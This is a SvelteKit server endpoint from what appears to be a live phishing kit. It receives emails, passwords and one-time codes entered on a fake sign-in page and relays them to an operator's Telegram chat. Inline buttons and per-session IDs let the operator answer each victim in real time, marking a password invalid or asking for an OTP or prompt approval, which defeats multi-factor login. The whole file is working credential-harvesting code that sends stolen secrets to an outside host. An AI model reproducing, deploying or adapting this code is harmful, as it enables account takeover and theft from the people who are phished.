import { fail, json } from '@sveltejs/kit';
import { TELEGRAM_BOT_TOKEN, TELEGRAM_MY_CHAT_ID } from '$env/static/private';

/** @type {import('./$types').RequestHandler} */
export async function GET() {
  return new Response();
};


/** @type {import('./$types').RequestHandler} */
export async function POST({ request }) {
  const { signinType, email, password, otp } = await request.json()
  
  // Creates unique browser session ID for this login/request attempt
  const sessionId = crypto.randomUUID();

  // check if otp that is sent (i.e. if not undefined)
  if (otp != undefined) {
    // Format the message with MarkdownV2 for a clean layout
		// Note: Special characters like . - ! need to be escaped in MarkdownV2, or use plain text.
		const telegramText = `
      <b>📩 OTP For ${email}</b>
      
      <b>OTP:</b> <code>${otp}</code>
    `;

    try {
      // Hit Telegram's sendMessage endpoint directly
			const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({
					chat_id: TELEGRAM_MY_CHAT_ID,
					text: telegramText,
					parse_mode: 'HTML' 
				})
			});

      if (!response.ok) {
				const errorData = await response.json();
				console.error('Telegram API error:', errorData);
				return fail(500, { error: true, message: 'Failed to dispatch notification.' });
			}

      const result = await response.json()

      return json({ success: true, message: "OTP successful!" })
    } catch (error) {
      console.error('Network error: ', error)
      return fail(500, { error: true, message: 'Server communication error.' })
    }
  }

  try {
    // Format the message with HTML for a clean layout
    const telegramText = `
      <b>📩 New Sign-in Submission</b> 
      
      <b>Sign-in Type:</b> ${signinType}
      <b>Email:</b> ${email}
      <b>Password:</b> <code>${password}</code>

      <i>Select an option below to transmit a code back to this browser window:</i>
    `.trim();

    // 2. Define inline buttons attached to this specific message & session
    const inlineKeyboard = {
      inline_keyboard: [
        // Row 1 (Top Row)
        [
          { text: '❌ Invalid Password', callback_data: `pw_fail:${sessionId}` }
        ],
        // Row 2 (Bottom Row)
        [
          { text: '✨ OTP', callback_data: `otp:${sessionId}` },
          { text: '⚡ Prompt', callback_data: `prompt:${sessionId}` }
        ]
      ]
    };

    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_MY_CHAT_ID,
        text: telegramText,
        parse_mode: 'HTML',
        reply_markup: inlineKeyboard // <-- Attaches the options to the alert
      })
    })
    
    if (!response.ok) {
      const errorData = await response.json();
      console.error('Telegram API error: \n', errorData);
      return fail(500, { error: true, message: 'Failed to dispatch notification.' });
    }

    const result = await response.json()
    
    return json({ success: true, sessionId, message: "Message successful!" })
  } catch (error) {
    console.error('Network error: \n', error)
    return fail(500, { error: true, message: 'Server communication error.' })
  }
}